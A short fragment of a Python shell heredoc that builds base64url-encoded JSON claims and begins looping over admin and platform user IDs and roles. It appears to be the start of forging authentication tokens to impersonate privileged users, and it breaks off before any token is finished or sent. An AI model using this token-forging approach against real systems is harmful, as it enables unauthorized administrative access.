python3 <<'PY'
import base64, json
def b64url(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
# try a few users
for sub, role, username in [(1,"admin","admin"),(2,"admin","admin"),(2,"platform","platform"),(1,"platform","platform")]:
